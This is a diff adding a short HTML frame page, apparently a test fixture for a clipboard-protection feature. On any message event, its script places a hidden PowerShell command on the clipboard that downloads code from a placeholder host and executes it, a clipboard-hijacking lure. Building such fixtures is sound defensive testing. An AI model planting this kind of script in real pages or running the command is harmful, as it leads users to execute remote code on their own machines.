@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"><title>frame</title>
+<script src="common.js"></script></head>
+<body>
+<script>
+window.addEventListener("message", () => {
+  window.__clipguard.writeText(`powershell -w hidden -c "iwr https://evil.invalid/c | iex"`);
+});
+</script>
+</body></html>
